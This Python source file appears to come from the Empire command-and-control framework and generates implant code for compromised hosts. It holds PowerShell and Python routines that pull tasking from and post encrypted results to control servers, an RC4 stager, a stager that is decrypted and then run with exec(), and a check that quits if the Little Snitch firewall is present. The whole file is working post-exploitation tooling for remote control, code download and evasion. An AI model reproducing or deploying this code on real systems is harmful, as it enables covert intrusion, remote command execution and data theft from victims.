import random
import string
from textwrap import dedent

from empire.server.common import helpers
from empire.server.utils.data_util import ps_convert_to_oneliner


def powershell_get_task(session_cookie):
    """
    Get task function for PowerShell agent.
    """
    return f"""
            $script:GetTask = {{
    
                try {{
                    if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {{
    
                        # meta 'TASKING_REQUEST' : 4
                        $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
                        $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
    
                        # build the web request object
                        $wc = New-Object System.Net.WebClient
    
                        # set the proxy settings for the WC to be the default system settings
                        $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                        $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                        if($Script:Proxy) {{
                            $wc.Proxy = $Script:Proxy;
                        }}
    
                        $wc.Headers.Add("User-Agent",$script:UserAgent)
                        $script:Headers.GetEnumerator() | % {{$wc.Headers.Add($_.Name, $_.Value)}}
                        $wc.Headers.Add("Cookie","{ session_cookie }session=$RoutingCookie")
    
                        # choose a random valid URI for checkin
                        $taskURI = $script:TaskURIs | Get-Random
                        $result = $wc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
                        $result
                    }}
                }}
                catch [Net.WebException] {{
                    $script:MissedCheckins += 1
                    if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {{
                        # restart key negotiation
                        Start-Negotiate -S "$ser" -SK $SK -UA $ua
                    }}
                }}
            }}
        """


def powershell_send_message():
    """
    Send message fucntion for PowerShell agent.
    """
    return """
        $script:SendMessage = {
            param($Packets)

            if($Packets) {
                # build and encrypt the response packet
                $EncBytes = Encrypt-Bytes $Packets

                # build the top level RC4 "routing packet"
                # meta 'RESULT_POST' : 5
                $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5

                if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
                    # build the web request object
                    $wc = New-Object System.Net.WebClient
                    # set the proxy settings for the WC to be the default system settings
                    $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                    $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                    if($Script:Proxy) {
                        $wc.Proxy = $Script:Proxy;
                    }

                    $wc.Headers.Add('User-Agent', $Script:UserAgent)
                    $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}

                    try {
                        # get a random posting URI
                        $taskURI = $Script:TaskURIs | Get-Random
                        $response = $wc.UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
                    }
                    catch [System.Net.WebException]{
                        # exception posting data...
                        if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
                            # restart key negotiation
                            Start-Negotiate -S "$ser" -SK $SK -UA $ua
                        }
                    }
                }
            }
        }
    """


def powershell_rc4():
    """
    RC4 Stageer code for PowerShell agent
    """
    rc4 = dedent(
        """
    $R={$D,$K=$Args;
    $S=0..255;
    0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;
    $S[$_],$S[$J]=$S[$J],$S[$_]};
    $D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;
    $S[$I],$S[$H]=$S[$H],$S[$I];
    $_-bxor$S[($S[$I]+$S[$H])%256]}};
    """
    )
    return ps_convert_to_oneliner(rc4)


def python_safe_checks():
    """
    Check for Little Snitch and exits if found.
    """
    return dedent(
        f"""
    import re, subprocess;
    cmd = "ps -ef | grep Little\ Snitch | grep -v grep"
    ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = ps.communicate();
    if re.search("Little Snitch", out.decode('UTF-8')):
       sys.exit();
    """
    )


def python_extract_stager(staging_key):
    """
    Download the stager and extract the IV for Python agent.
    """
    stager = dedent(
        f"""
    # ==== EXTRACT IV AND STAGER ====
    IV=a[0:4];
    data=a[4:];
    key=IV+'{ staging_key }'.encode('UTF-8');
    # ==== DECRYPT STAGER (RC4) ====
    S,j,out=list(range(256)),0,[];
    for i in list(range(256)):
        j=(j+S[i]+key[i%len(key)])%256;
        S[i],S[j]=S[j],S[i];
    i=j=0;
    for char in data:
        i=(i+1)%256;
        j=(j+S[i])%256;
        S[i],S[j]=S[j],S[i];
        out.append(chr(char^S[(S[i]+S[j])%256]));
    # ==== EXECUTE STAGER ====
    exec(''.join(out));
    """
    )
    return helpers.strip_python_comments(stager)


def python_send_message(session_cookie):
    """
    Send message function for Python agent.
    """
    return dedent(
        f"""
    def update_proxychain(proxy_list):
        setdefaultproxy()  # Clear the default chain
    
        for proxy in proxy_list:
            addproxy(proxytype=proxy['proxytype'], addr=proxy['addr'], port=proxy['port'])
    
    def send_message(packets=None):
        # Requests a tasking or posts data to a randomized tasking URI.
        # If packets == None, the agent GETs a tasking from the control server.
        # If packets != None, the agent encrypts the passed packets and
        #    POSTs the data to the control server.
        global missedCheckins
        global server
        global headers
        global taskURIs
        data = None
        if packets:
            # aes_encrypt_then_hmac is in stager.py
            encData = aes_encrypt_then_hmac(key, packets)
            data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
    
        else:
            # if we're GETing taskings, then build the routing packet to stuff info a cookie first.
            #   meta TASKING_REQUEST = 4
            routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
            b64routingPacket = base64.b64encode(routingPacket).decode('UTF-8')
            headers['Cookie'] = "{ session_cookie }session=%s" % (b64routingPacket)
        taskURI = random.sample(taskURIs, 1)[0]
        requestUri = server + taskURI
    
        try:
            wrapmodule(urllib.request)
            data = (urllib.request.urlopen(urllib.request.Request(requestUri, data, headers))).read()
            return ('200', data)
    
        except urllib.request.HTTPError as HTTPError:
            # if the server is reached, but returns an error (like 404)
            missedCheckins = missedCheckins + 1
            #if signaled for restaging, exit.
            if HTTPError.code == 401:
                sys.exit(0)
    
            return (HTTPError.code, '')
    
        except urllib.request.URLError as URLerror:
            # if the server cannot be reached
            missedCheckins = missedCheckins + 1
            return (URLerror.reason, '')
        return ('', '')

    """
    )


def generate_cookie():
    """
    Generate Cookie
    """

    chars = string.ascii_letters
    cookie = helpers.random_string(random.randint(6, 16), charset=chars)

    return cookie
